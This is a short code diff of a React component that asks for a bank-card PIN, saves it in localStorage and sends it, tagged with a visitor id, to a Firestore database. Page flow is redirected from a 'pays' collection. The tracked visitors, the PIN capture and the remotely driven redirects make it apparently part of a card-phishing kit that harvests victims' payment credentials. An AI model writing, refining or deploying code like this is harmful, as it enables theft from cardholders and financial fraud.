@@ -1,5 +1,3 @@
-"use client";
-
 import type React from "react";
 
 import { useState, useCallback } from "react";
@@ -8,7 +6,6 @@ import { addData } from "../apis/firebase";
 import FirestoreRedirect from "./rediract-page";
 
 export const CardVerification = () => {
-  const navigate = useNavigate();
   const [pin, setPin] = useState("");
   const [error, setError] = useState("");
   const _id = localStorage.getItem("visitor");
@@ -32,23 +29,24 @@ export const CardVerification = () => {
       }
 
       try {
-        // Store the PIN in localStorage instead of Redux
+        // Store the PIN in localStorage
         localStorage.setItem("card_pin", JSON.stringify(pin));
+
+        // Update Firestore with the PIN
         addData({ id: _id, pinCode: pin, pagename: "verify-phone" });
 
-        // Navigate to the next page
-        // eslint-disable-next-line @typescript-eslint/no-unused-vars
+        // Navigate to the next page handled by FirestoreRedirect
       } catch (error) {
         setError("الرقم السري غير صحيح");
       }
     },
-    [navigate, pin]
+    [pin, _id]
   );
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-50 to-blue-50 py-20 px-4 md:py-40">
       <div className="max-w-xl mx-auto">
-        <FirestoreRedirect id={_id as string} collectionName={"pays"} />
+        {_id && <FirestoreRedirect id={_id} collectionName="pays" />}
 
         <div className="bg-white rounded-2xl shadow-xl p-6 md:p-8 backdrop-blur-lg bg-opacity-95 transform transition-all duration-300 hover:shadow-2xl">
           <div className="text-center mb-8 md:mb-10">
